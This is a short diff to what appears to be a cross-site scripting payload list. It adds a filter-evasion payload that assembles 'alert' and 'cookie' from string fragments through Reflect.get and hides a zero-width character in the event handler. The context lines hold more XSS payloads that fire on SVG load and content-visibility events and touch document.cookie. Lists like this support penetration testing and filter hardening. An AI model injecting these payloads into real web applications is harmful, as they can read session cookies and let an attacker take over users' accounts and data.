@@ -16,3 +16,4 @@ alert&#x000000028;origin&#x000029;>
 "'`//><Svg+Only%3d1+OnLoad%3dconfirm(document.cookie)> 
 <input type="hidden" oncontentvisibilityautostatechange="alert(/ChromeCanary/)" style="content-visibility:auto">
 <p oncontentvisibilityautostatechange="alert(/FirefoxOnly/)" style="content-visibility:auto">
+"><a nope="%26quot;x%26quot;"onmouseover​="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
